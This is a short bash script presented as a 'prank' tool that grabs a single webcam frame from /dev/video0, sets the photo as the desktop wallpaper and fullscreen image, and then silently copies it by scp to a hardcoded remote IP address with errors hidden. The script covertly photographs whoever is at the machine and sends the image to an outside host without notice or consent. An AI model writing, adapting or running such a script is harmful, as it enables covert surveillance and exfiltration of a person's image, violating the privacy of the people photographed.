#!/bin/bash

# Touci Tool with permanent wallpaper

REMOTE_USER="touci"
REMOTE_IP="196.120.224.52"   # Public IP
REMOTE_PATH="/home/touci/Prank/"

IMG="/tmp/prank.png"

# Take snapshot
ffmpeg -y -f v4l2 -video_size 1280x720 -i /dev/video0 -frames:v 1 -update 1 "$IMG"

# Set wallpaper
if command -v feh >/dev/null 2>&1; then
    feh --fullscreen --hide-pointer "$IMG" &
fi

if command -v gsettings >/dev/null 2>&1; then
    gsettings set org.gnome.desktop.background picture-uri "file://$IMG"
    gsettings set org.gnome.desktop.background picture-uri-dark "file://$IMG"
fi

# Send to remote PC
scp "$IMG" $REMOTE_USER@$REMOTE_IP:$REMOTE_PATH 2>/dev/null

echo "done!!!"

